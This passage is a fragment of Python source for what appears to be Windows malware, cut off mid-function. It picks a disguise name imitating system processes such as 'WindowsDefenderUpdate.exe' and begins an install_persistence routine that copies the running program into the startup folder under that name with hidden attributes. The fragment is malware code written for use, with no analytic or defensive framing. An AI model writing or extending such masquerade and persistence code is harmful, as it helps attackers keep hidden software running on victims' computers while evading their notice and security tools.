        names = [
            "WindowsDefenderUpdate.exe",
            "RuntimeBrokerHelper.exe",
            "System32Assistant.exe",
            "BackgroundTasksHost.exe"
        ]
        return random.choice(names)
    
    def install_persistence(self) -> bool:
        """Copy to startup folder with hidden attributes"""
        try:
            current_file = sys.argv[0]
            target_path = os.path.join(self.startup_path, self.hidden_name)
            
            # Copy with different name
            with open(current_file, 'rb') as src:
